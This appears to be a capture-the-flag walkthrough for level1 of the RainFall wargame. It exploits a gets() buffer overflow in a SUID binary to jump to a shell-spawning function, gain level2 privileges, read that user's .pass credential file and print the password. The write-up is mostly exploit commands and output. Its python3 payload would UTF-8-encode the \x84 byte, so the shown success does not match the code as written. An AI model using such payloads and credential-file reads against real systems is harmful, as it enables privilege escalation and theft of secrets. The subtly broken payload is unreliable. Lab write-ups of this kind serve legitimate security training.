# RainFall: Level1 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level1@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level1@RainFall:~$ ls -l
-rwsr-s---+ 1 level2 users 7536 Aug 30  2022 level1
```

The binary is SUID-owned by `level2`. Executing it:

```bash
level1@RainFall:~$ ./level1
```

The program accepts user input and crashes when a large input is provided.

---

## Step 2: Source Code Analysis

The source code for `level1`:

```c
#include <stdio.h>
#include <stdlib.h>

int run() {
    printf("Good... Wait what?\n");
    return system("/bin/sh");
}

int main(int argc, char** argv, char** envp) {
    char buf[64];
    gets(buf);
    return (0);
}
```

* `gets()` reads input into `buf[64]` without bounds checking, resulting in a **buffer overflow**.
* The `run()` function spawns a shell using `system("/bin/sh")`, but it is never called directly.
* The goal is to overflow the return address in `main()` and redirect it to `run()`.

---

## Step 3: Determining the Offset

Generate a cyclic pattern to determine offset:

```bash
(gdb) run
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1...
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Use pwntools to find the offset:

```bash
>>> from pwn import *
>>> cyclic_find(0x63413563)
76
```

The return address is at offset **76**.

---

## Step 4: Finding `run()` Address

In GDB:

```gdb
disass run
0x08048444 <run>
```

Address of `run()` is `0x08048444`.

---

## Step 5: Crafting the Exploit

We overwrite the return address after 76 bytes:

```bash
python3 -c 'print("A"*76 + "\x44\x84\x04\x08")'
```

Testing the payload:

```bash
level1@RainFall:~$ (python3 -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ whoami
level2
```

---

## Step 6: Retrieving the Flag

```bash
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Step 7: Move to Level02

```bash
level1@RainFall:~$ su level2
Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
